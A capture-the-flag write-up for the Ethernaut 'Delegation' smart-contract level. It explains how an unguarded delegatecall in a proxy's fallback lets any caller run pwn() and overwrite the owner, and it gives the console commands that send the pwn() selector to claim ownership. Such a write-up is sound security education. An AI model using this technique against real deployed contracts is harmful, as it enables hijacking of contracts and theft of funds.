# **Level 06 - Delegation**

## 🎯 Goal  
To claim ownership of the contract "Delegation".

## 💥 Vulnerability  
The "Delegation" contract (= proxy-contract) uses `delegatecall(msg.data)` inside its fallback() function to forward calls to the "Delegate" contract (= main logic contract).
However, **delegatecall executes the target code in the context of the calling contract**, meaning it can modify the storage of "Delegation".

The part of the vulnerable code:
```solidity 
// Solidity code 
function pwn() public {
        owner = msg.sender;
    }
```

## 🛠 ️Solution (via browser console)
The following steps were executed:
```js
// JS console input 
// 0. Check current owner - not player 
(await contract.owner()).toString()

// 1. Get function calldata - need only function selector (first 4 bytes = 8 hex symbols)
await web3.utils.keccak256("pwn()")

// 2. Call fallback fuction via sending transaction in console with calldata
await contract.sendTransaction({data: "0xdd365b8b"})

// 3. Confirm new ownership - player
(await contract.owner()).toString()
```

## 🧙 Outcome
Ownership of the Delegation contract was successfully claimed by exploiting the delegatecall behavior — calling pwn() through the fallback function caused storage in "Delegation" to be updated.
